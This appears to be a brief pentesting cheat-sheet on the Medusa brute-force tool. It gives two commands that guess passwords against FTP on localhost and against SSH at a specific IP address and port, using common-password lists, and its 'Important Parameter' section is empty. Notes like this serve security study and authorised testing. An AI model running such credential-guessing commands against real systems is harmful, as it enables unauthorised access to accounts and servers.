---
type: tool
category: bruteforce
tags:
  - tool
---
# Overview

## Commands

### FTP

```bash
medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
```

### SSH
```bash
medusa -h 154.57.164.83 -n 38752 -u sshuser -P /usr/share/seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt -M ssh -t 3
```

## Important Parameter
